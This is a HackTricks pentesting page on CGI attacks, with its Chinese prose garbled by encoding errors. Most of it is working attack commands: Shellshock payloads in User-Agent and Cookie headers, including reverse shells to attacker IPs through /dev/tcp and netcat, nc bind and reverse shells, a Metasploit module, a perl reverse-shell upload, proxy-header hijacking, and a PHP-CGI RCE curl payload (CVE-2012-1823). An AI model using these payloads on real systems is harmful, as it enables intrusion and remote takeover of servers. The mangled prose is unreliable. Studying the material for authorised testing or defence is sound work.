<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# ä¿¡æ¯

**CGIè„šæœ¬æ˜¯perlè„šæœ¬**ï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨å·²ç»å…¥ä¾µäº†ä¸€ä¸ªå¯ä»¥æ‰§è¡Œ_**.cgi**_è„šæœ¬çš„æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥**ä¸Šä¼ ä¸€ä¸ªperlåå‘shell**ï¼ˆ`/usr/share/webshells/perl/perl-reverse-shell.pl`ï¼‰ï¼Œ**å°†æ‰©å±•å**ä»**.pl**æ›´æ”¹ä¸º**.cgi**ï¼Œç»™äºˆ**æ‰§è¡Œæƒé™**ï¼ˆ`chmod +x`ï¼‰ï¼Œç„¶å**ä»Webæµè§ˆå™¨è®¿é—®**åå‘shellä»¥æ‰§è¡Œå®ƒã€‚
ä¸ºäº†æµ‹è¯•**CGIæ¼æ´**ï¼Œå»ºè®®ä½¿ç”¨`nikto -C all`ï¼ˆä»¥åŠæ‰€æœ‰æ’ä»¶ï¼‰

# **ShellShock**

**ShellShock**æ˜¯ä¸€ä¸ªå½±å“å¹¿æ³›ä½¿ç”¨çš„Unixæ“ä½œç³»ç»Ÿä¸­çš„**Bash**å‘½ä»¤è¡Œshellçš„**æ¼æ´**ã€‚å®ƒé’ˆå¯¹Bashè¿è¡Œåº”ç”¨ç¨‹åºä¼ é€’çš„å‘½ä»¤çš„èƒ½åŠ›ã€‚æ¼æ´åœ¨äº**ç¯å¢ƒå˜é‡**çš„æ“çºµï¼Œç¯å¢ƒå˜é‡æ˜¯åŠ¨æ€å‘½åå€¼ï¼Œå½±å“è®¡ç®—æœºä¸Šè¿›ç¨‹è¿è¡Œçš„æ–¹å¼ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å°†**æ¶æ„ä»£ç **é™„åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯¥ä»£ç åœ¨æ¥æ”¶åˆ°å˜é‡æ—¶æ‰§è¡Œã€‚è¿™ä½¿æ”»å‡»è€…æœ‰å¯èƒ½ compromise ç³»ç»Ÿã€‚

åˆ©ç”¨æ­¤æ¼æ´ï¼Œ**é¡µé¢å¯èƒ½ä¼šæŠ›å‡ºé”™è¯¯**ã€‚

æ‚¨å¯ä»¥é€šè¿‡æ³¨æ„åˆ°å®ƒä½¿ç”¨**æ—§çš„Apacheç‰ˆæœ¬**å’Œ**cgi_mod**ï¼ˆå¸¦æœ‰cgiæ–‡ä»¶å¤¹ï¼‰æˆ–ä½¿ç”¨**nikto**æ¥**å‘ç°**æ­¤æ¼æ´ã€‚

## **æµ‹è¯•**

å¤§å¤šæ•°æµ‹è¯•åŸºäºå›æ˜¾æŸäº›å†…å®¹å¹¶æœŸæœ›è¯¥å­—ç¬¦ä¸²åœ¨Webå“åº”ä¸­è¿”å›ã€‚å¦‚æœæ‚¨è®¤ä¸ºæŸä¸ªé¡µé¢å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œè¯·æœç´¢æ‰€æœ‰cgié¡µé¢å¹¶å¯¹å…¶è¿›è¡Œæµ‹è¯•ã€‚

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curlï¼ˆåå°„ï¼Œç›²ç›®å’Œå¸¦å¤–ï¼‰**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## åˆ©ç”¨
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **ä»£ç† \(ä¸­é—´äººæ”»å‡»åˆ° Web æœåŠ¡å™¨è¯·æ±‚\)**

CGI ä¸ºæ¯ä¸ª HTTP è¯·æ±‚ä¸­çš„å¤´éƒ¨åˆ›å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚ï¼š"host:web.com" è¢«åˆ›å»ºä¸º "HTTP\_HOST"="web.com"

ç”±äº web æœåŠ¡å™¨å¯èƒ½ä½¿ç”¨ HTTP\_PROXY å˜é‡ã€‚å°è¯•å‘é€ä¸€ä¸ªåŒ…å«ï¼š "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**" çš„ **å¤´éƒ¨**ï¼Œå¦‚æœæœåŠ¡å™¨åœ¨ä¼šè¯æœŸé—´æ‰§è¡Œä»»ä½•è¯·æ±‚ã€‚æ‚¨å°†èƒ½å¤Ÿæ•è·æœåŠ¡å™¨å‘å‡ºçš„æ¯ä¸ªè¯·æ±‚ã€‚

# æ—§ PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

åŸºæœ¬ä¸Šï¼Œå¦‚æœ cgi å¤„äºæ´»åŠ¨çŠ¶æ€ä¸” php æ˜¯ "æ—§çš„" \(&lt;5.3.12 / &lt; 5.4.2\)ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»£ç ã€‚
ä¸ºäº†åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦è®¿é—® Web æœåŠ¡å™¨çš„æŸä¸ª PHP æ–‡ä»¶ï¼Œè€Œæ— éœ€å‘é€å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯ä¸å‘é€å­—ç¬¦ "="ï¼‰ã€‚
ç„¶åï¼Œä¸ºäº†æµ‹è¯•æ­¤æ¼æ´ï¼Œæ‚¨å¯ä»¥è®¿é—®ä¾‹å¦‚ `/index.php?-s`ï¼ˆæ³¨æ„ `-s`ï¼‰ï¼Œ**åº”ç”¨ç¨‹åºçš„æºä»£ç å°†å‡ºç°åœ¨å“åº”ä¸­**ã€‚

ç„¶åï¼Œä¸ºäº†è·å¾— **RCE**ï¼Œæ‚¨å¯ä»¥å‘é€è¿™ä¸ªç‰¹æ®ŠæŸ¥è¯¢ï¼š `/?-d allow_url_include=1 -d auto_prepend_file=php://input` å’Œè¦åœ¨ **è¯·æ±‚çš„æ­£æ–‡ä¸­æ‰§è¡Œçš„ PHP ä»£ç ã€‚
ç¤ºä¾‹:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**æœ‰å…³æ¼æ´å’Œå¯èƒ½çš„åˆ©ç”¨çš„æ›´å¤šä¿¡æ¯ï¼š** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
